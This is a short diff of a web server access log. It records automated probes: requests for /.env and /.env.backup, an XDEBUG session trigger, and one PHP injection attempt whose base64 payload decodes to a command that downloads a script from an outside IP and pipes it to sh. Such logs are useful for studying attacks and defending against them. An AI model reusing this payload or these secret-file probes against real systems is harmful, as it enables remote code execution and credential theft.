@@ -2818,3 +2818,4 @@ INFO:     196.251.85.74:51466 - "GET /.env.backup HTTP/1.1" 404 Not Found
 INFO:     185.242.226.163:39959 - "GET / HTTP/1.1" 200 OK
 INFO:     176.65.148.52:57114 - "GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode("Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo"));die()?> HTTP/1.1" 404 Not Found
 INFO:     196.251.81.194:54706 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     79.124.58.198:35168 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 OK
